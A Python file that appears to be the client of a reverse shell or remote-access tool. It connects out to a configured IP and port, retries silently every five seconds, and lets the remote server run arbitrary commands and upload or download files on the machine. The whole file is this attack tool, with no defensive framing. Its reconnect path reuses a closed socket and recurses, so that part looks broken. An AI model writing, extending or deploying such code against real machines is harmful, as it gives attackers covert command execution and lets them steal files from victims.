import socket
import time
from typing import Callable
from lib import cmd, comm, config, string_utils


def shell(server: socket.socket):
    while True:
        func, args = string_utils.extract_command(
            comm.receive(server, config.CLIENT_VERBOSE)
        )

        # quit
        if func == "quit":
            break
        # download [source] [target]
        elif func == "download":
            cmd.upload(server, args, config.CLIENT_VERBOSE)
        # upload [source] [target]
        elif func == "upload":
            cmd.download(server, args, config.CLIENT_VERBOSE)
        # exec [func] [...args]
        elif func == "exec":
            cmd.exec(server, " ".join(args), config.CLIENT_VERBOSE)


def connect_server(
    server: socket.socket,
    shell: Callable[[socket.socket], None],
    timeout: int,
):
    while True:
        time.sleep(timeout)
        try:
            server.connect((config.IP, config.PORT))
            shell(server)
            server.close()
            break
        except:
            server.close()
            connect_server(server, shell, timeout)


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect_server(sock, shell, 5)
